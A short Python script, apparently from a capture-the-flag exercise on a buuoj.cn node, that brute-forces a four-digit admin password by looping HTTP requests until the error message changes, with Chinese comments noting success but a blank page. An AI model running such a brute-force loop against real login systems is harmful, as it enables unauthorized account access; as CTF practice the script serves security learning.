import requests
url = "http://80d69926-84c1-4444-9702-2494cb97d0da.node4.buuoj.cn:81/?username=admin&password="

for i in range(1000, 10000):
    res = requests.get(url + str(i))
    print("[*] 尝试: ", str(i))
    if res.text != "密码错误，为四位数字。":
        print("爆破成功")
        print(res.text)
        break

"""
爆破成功,但是返回的页面是空白。。。
"""